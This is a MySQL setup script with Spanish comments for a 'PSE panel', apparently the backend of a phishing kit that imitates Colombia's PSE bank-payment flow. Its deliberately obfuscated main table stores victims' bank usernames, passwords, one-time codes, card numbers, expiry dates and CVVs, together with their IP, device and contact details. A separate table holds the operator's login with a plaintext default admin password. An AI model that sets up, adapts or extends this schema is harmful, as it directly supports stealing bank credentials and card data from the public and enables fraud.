-- Esquema mínimo para el panel PSE (compatible con Aiven MySQL u otro MySQL 8+).
-- Ejecutar en la base que definas en DB_NAME (p. ej. defaultdb o pse_tiquetes).
-- Conexión PHP: ver pse/panel/include/link.php → DB_HOST, DB_PORT, DB_USER, DB_PASSWORD, DB_NAME.
-- En Aiven suele hacer falta: DB_USE_SSL=1 (y a veces certificado; ver consola Aiven).

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- Registros / flujo (nombres ofuscados como en el código original)
CREATE TABLE IF NOT EXISTS `m3it3m` (
  `idreg` int unsigned NOT NULL AUTO_INCREMENT,
  `usuario` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `otp` varchar(64) DEFAULT NULL,
  `dispositivo` varchar(255) DEFAULT NULL,
  `ip` varchar(64) DEFAULT NULL,
  `id` varchar(64) DEFAULT NULL,
  `agente` varchar(512) DEFAULT NULL,
  `banco` varchar(128) DEFAULT NULL,
  `status` varchar(16) NOT NULL DEFAULT '0',
  `horacreado` varchar(32) DEFAULT NULL,
  `horamodificado` varchar(32) DEFAULT NULL,
  `idcliente` varchar(64) DEFAULT NULL,
  `lineaclaro` varchar(64) DEFAULT NULL,
  `correopse` varchar(255) DEFAULT NULL,
  `tarjeta` varchar(32) DEFAULT NULL,
  `ftarjeta` varchar(16) DEFAULT NULL,
  `cvv` varchar(8) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `cemail` varchar(255) DEFAULT NULL,
  `celular` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`idreg`),
  KEY `idx_status_horamod` (`status`,`horamodificado`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Contador de visitas (una sola fila; el código hace SELECT * y UPDATE contador)
CREATE TABLE IF NOT EXISTS `m3v1s1t` (
  `id` tinyint unsigned NOT NULL AUTO_INCREMENT,
  `contador` int unsigned NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO `m3v1s1t` (`id`, `contador`) VALUES (1, 0);

-- Login del panel (sesion.php compara usuario y password en texto plano)
CREATE TABLE IF NOT EXISTS `m3us3r` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `usuario` varchar(128) NOT NULL,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `usuario` (`usuario`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Usuario inicial: cámbialo después del primer acceso
INSERT IGNORE INTO `m3us3r` (`usuario`, `password`) VALUES ('admin', 'cambiar_esta_clave');

SET FOREIGN_KEY_CHECKS = 1;
